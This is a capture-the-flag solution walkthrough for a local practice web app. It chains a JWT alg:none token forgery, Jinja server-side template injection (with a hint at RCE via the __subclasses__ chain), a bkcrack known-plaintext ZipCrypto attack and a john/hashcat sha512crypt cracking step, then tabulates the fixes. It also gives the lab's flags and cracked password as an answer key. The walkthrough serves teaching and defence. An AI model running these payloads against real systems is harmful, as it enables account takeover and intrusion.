# Cogwheel CI — SOLUTION (spoilers)

> Stop here if you're still working it. Full walkthrough below.

Base URL: `http://localhost:8093`. The chain is **JWT alg:none → SSTI → known-plaintext
ZIP (bkcrack) → salted-hash crack**, and every stage feeds the next.

---

## Stage 1 — JWT forgery (`alg:none`) → flag1

Load `/` once to get issued a guest token, then look at it:

```bash
curl -s -c jar http://localhost:8093/ >/dev/null
curl -s -b jar http://localhost:8093/api/whoami        # {"role":"viewer","user":"guest"}
```

The `cog_session` cookie is a JWT: `header.payload.signature`, each part base64url. The
guest token is genuinely HS256-signed, but the verifier (`verify_token` in `app.py`)
accepts a token whose header says `{"alg":"none"}` **without checking the signature**. So
forge one: set alg `none`, set `role` to `admin`, leave the signature empty.

```python
import base64, json
b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
h = b64u(json.dumps({"alg":"none","typ":"JWT"},separators=(',',':')).encode())
p = b64u(json.dumps({"user":"guest","role":"admin"},separators=(',',':')).encode())
print(f"{h}.{p}.")            # note the trailing dot: empty signature
```

```bash
TOK='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.'
curl -s -b "cog_session=$TOK" http://localhost:8093/api/whoami     # role: admin
curl -s -b "cog_session=$TOK" http://localhost:8093/admin | grep -o 'FLAG{[^}]*}'
```

**`flag1 = FLAG{jwt_4lg_n0n3_f0rg3d_4dm1n}`**

---

## Stage 2 — Server-Side Template Injection → flag2 (+ the bundle name)

The admin "build announcement" preview posts to `/api/render`, which runs your string
through `render_template_string()`. Confirm, then dump the config:

```bash
curl -s -b "cog_session=$TOK" -H 'Content-Type: application/json' \
     -d '{"template":"{{7*7}}"}' http://localhost:8093/api/render          # -> "49"

curl -s -b "cog_session=$TOK" -H 'Content-Type: application/json' \
     -d '{"template":"{{ config.items()|list }}"}' http://localhost:8093/api/render
```

The config dump contains **`flag2`** and the unguessable artifact name
`ci-artifacts-8f2a91.zip` plus the note that `banner.png` inside it is also public.
(Deeper SSTI — `{{ ''.__class__.__mro__[1].__subclasses__() }}` etc. — reaches file read /
RCE, but the config leak is all you need here.)

**`flag2 = FLAG{ssti_j1nj4_c0nf1g_l34k3d}`**

---

## Stage 3 — Known-plaintext ZIP attack (bkcrack) → flag3

Grab the encrypted bundle (admin-gated) and the public copy of the known member:

```bash
curl -s -b "cog_session=$TOK" "http://localhost:8093/download?name=ci-artifacts-8f2a91.zip" -o bundle.zip
curl -s "http://localhost:8093/static/banner.png" -o banner.png
unzip -l bundle.zip          # banner.png, flag3.txt, vault_hashes.txt (all "store")
```

`banner.png` in the archive is byte-identical to `/static/banner.png` → known plaintext.
ZipCrypto folds:

```bash
bkcrack -C bundle.zip -c banner.png -p banner.png
#   -> Keys: 76e1827b 1d00f22f 8f0844d9   (varies per build)
```

Repack with a known password and extract (cleanest), or `-d` each member:

```bash
bkcrack -C bundle.zip -k 76e1827b 1d00f22f 8f0844d9 -U cracked.zip newpass
unzip -P newpass cracked.zip
cat flag3.txt
```

**`flag3 = FLAG{z1pcrypt0_kn0wn_pl41nt3xt_bkcr4ck}`**

> Why it works: ZipCrypto's keystream depends only on the password, not the data. With ~12+
> bytes of matching plaintext/ciphertext (here, a whole 8.8 KB PNG) bkcrack recovers the
> three internal keys and can decrypt every member — the password itself is never needed.

---

## Stage 4 — Salted password cracking → flag4

The bundle also held `vault_hashes.txt`:

```
svc_deploy:$6$lcr81F0J9j6GF7St$yn81fz57ZScNYp1a0RijnKG4Zoy...JOCPoH1
```

`$6$` = sha512crypt (per-user salt `lcr81F0J9j6GF7St`). On this Mac, use john's **native**
sha512crypt format (the system-`crypt` format won't load `$6$`):

```bash
grep svc_deploy vault_hashes.txt > crackme.txt
john --format=sha512crypt --wordlist=~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt crackme.txt
john --format=sha512crypt --show crackme.txt        # svc_deploy:liverpool8
# hashcat equivalent:  hashcat -m 1800 crackme.txt rockyou.txt
```

Password is **`liverpool8`** (~11 s). Submit it to the deploy vault:

```bash
curl -s -b "cog_session=$TOK" -H 'Content-Type: application/json' \
     -d '{"password":"liverpool8"}' http://localhost:8093/api/vault/unlock
```

**`flag4 = FLAG{s4lt3d_sh4512crypt_r0cky0u_cr4ck3d}`**

---

## The bugs & the fixes

| # | Vulnerability | Root cause | Fix |
|---|---|---|---|
| 1 | JWT `alg:none` | verifier trusts the token's own `alg` header and skips the signature | pin the algorithm server-side; reject `none`; verify HS256 with a fixed key |
| 2 | SSTI | user input passed to `render_template_string()` | render static templates with user data as *context*, never as the template; sandbox if unavoidable |
| 3 | Known-plaintext ZIP | legacy ZipCrypto + an attacker-known member | use AES (AE-2/WinZip) archives; never ship artifacts whose plaintext is public alongside secrets |
| 4 | Crackable credential | rockyou-tier password shipped in a downloadable artifact | strong secrets + slow KDF; keep credential stores out of build artifacts entirely |

All four are in `app.py` (stages 1/2/4) and the `Dockerfile` bundle build (stage 3), each
marked with a `VULN #n` comment.
